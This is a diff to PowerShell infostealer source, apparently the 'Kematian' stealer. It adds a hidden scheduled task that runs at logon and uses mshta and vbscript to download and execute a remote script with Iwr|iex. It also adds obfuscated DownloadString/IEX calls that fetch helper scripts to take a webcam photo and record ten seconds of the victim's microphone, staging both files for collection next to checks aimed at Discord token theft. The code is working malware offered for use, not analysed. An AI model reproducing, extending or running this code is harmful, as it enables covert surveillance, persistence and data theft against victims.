@@ -7,6 +7,7 @@
 #$persistence = $false
 #$write_disk_only = $false
 #$vm_protect = $false
+#$record_mic = $true
 #$encryption_key = "YOUR_ENC_KEY_HERE"
 [Net.ServicePointManager]::SecurityProtocol = "Tls, Tls11, Tls12, Ssl3"
 
@@ -83,10 +84,10 @@ function Invoke-TASKS {
         $KDOT_DIR.Attributes = "Hidden", "System"
         $task_name = "Kematian"
         $task_action = if ($debug) {
-            New-ScheduledTaskAction -Execute "Powershell.exe" -Argument "-ExecutionPolicy Bypass -NoProfile -C `"`$webhook='$webhook';`$debug=`$$debug;`$vm_protect=`$$vm_protect;`$encryption_key ='$encryption_key';`$blockhostsfile=`$$blockhostsfile;`$criticalprocess=`$$criticalprocess;`$melt=`$$melt;`$fakeerror=`$$fakeerror;`$persistence=`$$persistence;`$write_disk_only=`$False;`$t = Iwr -Uri 'https://raw.githubusercontent.com/Agonyxxx/Injection/main/main.ps1'|iex`""
+            New-ScheduledTaskAction -Execute "Powershell.exe" -Argument "-ExecutionPolicy Bypass -NoProfile -C `"`$webhook='$webhook';`$debug=`$$debug;`$vm_protect=`$$vm_protect;`$encryption_key ='$encryption_key';`$blockhostsfile=`$$blockhostsfile;`$criticalprocess=`$$criticalprocess;`$melt=`$$melt;`$fakeerror=`$$fakeerror;`$persistence=`$$persistence;`$write_disk_only=`$False;`$t = Iwr -Uri 'https://raw.githubusercontent.com/Somali-Devs/Kematian-Stealer/main/frontend-src/main.ps1'|iex`""
         }
         else {
-            New-ScheduledTaskAction -Execute "mshta.exe" -Argument "vbscript:createobject(`"wscript.shell`").run(`"powershell `$webhook='$webhook';`$debug=`$$debug;`$vm_protect=`$$vm_protect;`$encryption_key ='$encryption_key';`$blockhostsfile=`$$blockhostsfile;`$criticalprocess=`$$criticalprocess;`$melt=`$$melt;`$fakeerror=`$$fakeerror;`$persistence=`$$persistence;`$write_disk_only=`$False;`$t = Iwr -Uri 'https://raw.githubusercontent.com/Agonyxxx/Injection/main/main.ps1'|iex`",0)(window.close)"
+            New-ScheduledTaskAction -Execute "mshta.exe" -Argument "vbscript:createobject(`"wscript.shell`").run(`"powershell `$webhook='$webhook';`$debug=`$$debug;`$vm_protect=`$$vm_protect;`$encryption_key ='$encryption_key';`$blockhostsfile=`$$blockhostsfile;`$criticalprocess=`$$criticalprocess;`$melt=`$$melt;`$fakeerror=`$$fakeerror;`$persistence=`$$persistence;`$write_disk_only=`$False;`$t = Iwr -Uri 'https://raw.githubusercontent.com/Somali-Devs/Kematian-Stealer/main/frontend-src/main.ps1'|iex`",0)(window.close)"
         }
         $task_trigger = New-ScheduledTaskTrigger -AtLogOn
         $task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
@@ -989,6 +990,35 @@ function Backup-Data {
 
     Set-Location "$env:LOCALAPPDATA\Temp"
 
+    # webcam
+    Write-Host "[!] Capturing an image with Webcam" -ForegroundColor Green
+    $webcam = ("https://github.com/Somali-Devs/Kematian-Stealer/raw/main/frontend-src/webcam.ps1")
+    $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$webcam')"
+    $invokewebcam = Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru
+    $invokewebcam.WaitForExit()
+    $webcam_image = "$env:temp\webcam.png"
+    if (Test-Path -Path $webcam_image) {
+        Move-Item -Path $webcam_image -Destination $folder_general
+        Write-Host "[!] The webcam image moved successfully to $folder_general" -ForegroundColor Green
+    } else {
+        Write-Host "[!] The webcam image does not exist." -ForegroundColor Red
+    }
+    
+    # record mic for 10 sec
+    if ($record_mic) {
+    Write-Host "[!] Recording PC MIC for 10 seconds" -ForegroundColor Green
+    $mic = ("https://github.com/Somali-Devs/Kematian-Stealer/raw/main/frontend-src/mic.ps1")
+    $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$mic')"
+    $invokemic = Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru
+    $invokemic.WaitForExit()
+    $mic_image = "$env:temp\mic.wav"
+    if (Test-Path -Path $mic_image) {
+        Move-Item -Path $mic_image -Destination $folder_general
+        Write-Host "[!] The mic.wav file moved successfully to $folder_general" -ForegroundColor Green
+    } else {
+        Write-Host "[!] The mic.wav file does not exist." -ForegroundColor Red
+     }
+    }
 
     $token_prot = Test-Path "$env:APPDATA\DiscordTokenProtector\DiscordTokenProtector.exe"
     if ($token_prot -eq $true) {
